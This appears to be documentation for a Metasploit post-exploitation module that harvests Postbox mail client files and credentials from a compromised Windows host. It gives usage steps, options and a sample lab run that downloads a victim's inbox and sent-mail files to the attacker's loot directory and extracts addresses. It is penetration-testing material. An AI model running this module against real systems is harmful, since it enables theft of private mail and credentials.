## Module Description

This post-exploitation module gathers artifacts found on Postbox related folders from end users systems.

The list of available artifcts are listed within the module and can be added at anytime. Each artifacts are categorised so that users can specify a category to look for.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/postbox
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### REGEX

Users can set their own regular expressions so that it could be applied for the credential extraction. The default is set to ^password.

### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifcats/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by defalt and will perform the data extraction using the predefined regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Example Run
### Default Output
  ```
msf6 post(windows/gather/credentials/postbox) > run 

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_CREDENTIALS_FROM_FILE: true

[*] Postbox's parent folder found
[*] Postbox's Inbox file found
[*] Downloading C:\Users\IEUser\AppData\Roaming\PostboxApp\Profiles\b6yf1u6g.default\ImapMail\outlook.office365.com\INBOX
[*] Postbox Inbox downloaded
[+] File saved to:  /root/.msf4/loot/20210513064136_default_192.168.56.106_postboxINBOX_465924.bin

[+] To:Subject:Date:MIME-Version:Reply-To:List-ID:X-CSA-Complaints:
[+] To:<*************@outlook.jp>
[+] To:"NoReplyOneDrive"<reply-fed017787564057e-25_HTML-166935770-7231722-937213@mail.onedrive.com>
[+] To:Subject:Date:MIME-Version:Reply-To:List-ID:X-CSA-Complaints:
[+] From:"MicrosoftOneDrive"<email@mail.onedrive.com>
[+] From:To:Subject:Date:MIME-Version:Reply-To:List-ID:X-CSA-Complaints:

[+] File with credentials saved:  /root/.msf4/loot/20210513064136_default_192.168.56.106_EXTRACTIONINBOX_835546.bin
[*] Postbox's parent folder found
[*] Postbox's Sent* file found
[*] Downloading C:\Users\IEUser\AppData\Roaming\PostboxApp\Profiles\b6yf1u6g.default\ImapMail\outlook.office365.com\Sent-1.msf
[*] Postbox Sent-1.msf downloaded
[+] File saved to:  /root/.msf4/loot/20210513064137_default_192.168.56.106_postboxSent1.ms_354629.msf

  ```